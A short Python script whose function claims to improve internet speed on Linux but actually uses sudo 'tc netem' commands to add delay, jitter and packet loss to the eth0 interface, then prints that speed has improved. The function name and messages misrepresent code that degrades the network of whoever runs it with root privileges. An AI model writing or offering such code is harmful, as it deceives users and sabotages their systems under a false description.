import subprocess
import os

def improve_internet_speed():
    if os.name != "posix":
        print("This feature is only available on Linux systems.")
        return

    print("Improving internet speed...")

    subprocess.run(["sudo", "tc", "qdisc", "add", "dev", "eth0", "root", "netem", "delay", "20ms", "10ms", "25%"])
    subprocess.run(["sudo", "tc", "qdisc", "add", "dev", "eth0", "root", "netem", "loss", "0.1%"])

    print("Internet speed improved!")
